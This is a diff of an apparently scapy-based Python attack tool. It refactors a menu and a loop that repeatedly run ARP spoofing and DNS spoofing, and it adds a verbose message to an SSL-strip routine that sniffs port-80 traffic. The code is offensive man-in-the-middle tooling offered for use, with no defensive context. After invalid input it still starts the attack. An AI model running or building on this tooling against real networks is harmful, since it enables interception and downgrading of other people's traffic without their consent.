@@ -110,26 +110,20 @@ def ssl_strip(packet):
             send(packet, verbose=0)
 
 def ssl_strip_attack(verbose=False):
+    if verbose:
+        print "Starting SSL strip attack"
+
     # prn = function to apply to each sniffed packet
     sniff(filter="tcp and port 80", prn=ssl_strip)
 	
 
 # =============== Text Interface ===============
 
-def silent_mode():
+def attack(wantVerbose):
     try:
         while True:
-            ARP_spoofing()
-            dns_spoof_attack()
-            time.sleep(20)
-    except KeyboardInterrupt:
-        pass
-
-def all_out_mode():
-    try:
-        while True:
-            ARP_spoofing(verbose=True)
-            dns_spoof_attack(verbose=True)
+            ARP_spoofing(verbose=wantVerbose)
+            dns_spoof_attack(verbose=wantVerbose)
             time.sleep(20)
     except KeyboardInterrupt:
         pass
@@ -138,10 +132,13 @@ if __name__ == "__main__":
     mode = str(input(   "Plase select the attack mode:\n" +
                     "type \"1\" for silent mode;\n" +
                     "type \"2\" for all out mode\n"))
+    wantVerbose = False
     if mode == "1":
-        silent_mode()
+        wantVerbose = False
     elif mode == "2":
-        all_out_mode()
+        wantVerbose = True
     else:
         print("Input error!")
+
+    attack(wantVerbose)
         
